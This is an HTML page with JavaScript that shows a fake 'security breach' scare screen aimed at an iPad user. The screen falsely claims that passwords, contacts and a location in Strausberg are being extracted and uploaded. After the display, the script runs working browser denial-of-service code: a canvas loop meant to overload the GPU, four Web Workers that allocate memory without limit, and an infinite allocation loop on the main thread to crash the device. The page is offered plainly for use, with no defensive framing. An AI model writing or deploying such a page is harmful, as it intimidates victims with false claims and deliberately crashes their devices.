<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Security Alert</title>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body { background: #000; color: #00ff00; font-family: 'Courier New', monospace; overflow: hidden; }
    #overlay { position: fixed; inset: 0; background: rgba(0,0,0,0.95); display: flex; flex-direction: column; align-items: center; justify-content: center; z-index: 9999; }
    #warning { color: #ff0000; font-size: 28px; font-weight: bold; text-align: center; animation: blink 0.3s infinite; margin-bottom: 20px; }
    @keyframes blink { 0%, 100% { opacity: 1; } 50% { opacity: 0; } }
    #terminal { width: 90%; max-width: 600px; height: 300px; overflow: hidden; border: 1px solid #00ff00; padding: 10px; font-size: 12px; line-height: 1.4; }
    #progress { width: 90%; max-width: 600px; margin-top: 20px; height: 20px; border: 1px solid #ff0000; }
    #progressbar { height: 100%; width: 0%; background: #ff0000; }
    #status { color: #ff0000; margin-top: 10px; font-size: 14px; }
    #canvas-container { position: fixed; inset: 0; z-index: 1; opacity: 0; }
  </style>
</head>
<body>
  <div id="canvas-container"><canvas id="c"></canvas></div>
  <div id="overlay">
    <div id="warning">⚠ SECURITY BREACH DETECTED ⚠</div>
    <div id="terminal"></div>
    <div id="progress"><div id="progressbar"></div></div>
    <div id="status">ACCESSING DEVICE DATA...</div>
  </div>

  <script>
    const terminal = document.getElementById('terminal');
    const progressbar = document.getElementById('progressbar');
    const status = document.getElementById('status');
    const canvasContainer = document.getElementById('canvas-container');
    const canvas = document.getElementById('c');
    const ctx = canvas.getContext('2d');

    canvas.width = window.innerWidth * 4;
    canvas.height = window.innerHeight * 4;

    const lines = [
      '> Initializing breach protocol...',
      '> Scanning network interfaces...',
      '> Found device: iPad (MDM managed)',
      '> Bypassing MDM restrictions...',
      '> Extracting contacts database...',
      '> Contacts found: 247',
      '> Accessing iCloud keychain...',
      '> Passwords extracted: 89',
      '> Locating device GPS...',
      '> Location: Strausberg, Brandenburg',
      '> Uploading data to remote server...',
      '> Disabling security features...',
      '> Installing backdoor...',
      '> Access granted.',
    ];

    let lineIndex = 0;
    let progress = 0;

    const typeLines = setInterval(() => {
      if (lineIndex < lines.length) {
        const p = document.createElement('p');
        p.textContent = lines[lineIndex];
        terminal.appendChild(p);
        terminal.scrollTop = terminal.scrollHeight;
        lineIndex++;
        progress = (lineIndex / lines.length) * 70;
        progressbar.style.width = progress + '%';
      }
    }, 400);

    setTimeout(() => {
      status.textContent = 'EXECUTING PAYLOAD — SYSTEM COMPROMISED';

      let p = 70;
      const fillProgress = setInterval(() => {
        p += 2;
        progressbar.style.width = p + '%';
        if (p >= 100) {
          clearInterval(fillProgress);
          status.textContent = 'COMPLETE — DEVICE COMPROMISED';

          // Phase 1: GPU-Kill via Canvas
          canvasContainer.style.opacity = '1';
          let frameCount = 0;
          const gpuKill = () => {
            for(let i = 0; i < 500; i++) {
              ctx.beginPath();
              ctx.arc(
                Math.random() * canvas.width,
                Math.random() * canvas.height,
                Math.random() * 200,
                0, Math.PI * 2
              );
              ctx.fillStyle = `hsl(${Math.random()*360},100%,50%)`;
              ctx.fill();
              ctx.filter = 'blur(10px) contrast(200%)';
            }
            // Riesige ImageData hin und her kopieren
            const imageData = ctx.getImageData(0, 0, canvas.width, canvas.height);
            ctx.putImageData(imageData, Math.random() * 10, Math.random() * 10);
            frameCount++;
            requestAnimationFrame(gpuKill);
          };
          requestAnimationFrame(gpuKill);

          // Phase 2: gleichzeitig RAM-Kill + Worker-Flood
          setTimeout(() => {
            // Mehrere Worker spawnen die alle RAM fressen
            const workerCode = `
              const arr = [];
              while(true) {
                arr.push(new Array(500000).fill('☠'));
              }
            `;
            const blob = new Blob([workerCode], {type: 'application/javascript'});
            const url = URL.createObjectURL(blob);

            // 4 Worker gleichzeitig → GPU läuft schon heiß, jetzt RAM
            for(let i = 0; i < 4; i++) {
              new Worker(url);
            }

            // Main thread auch killen
            const arr = [];
            while(true) {
              arr.push(new Array(1000000).fill('💀'));
            }
          }, 2000);
        }
      }, 80);
    }, 6000);
  </script>
</body>
</html>
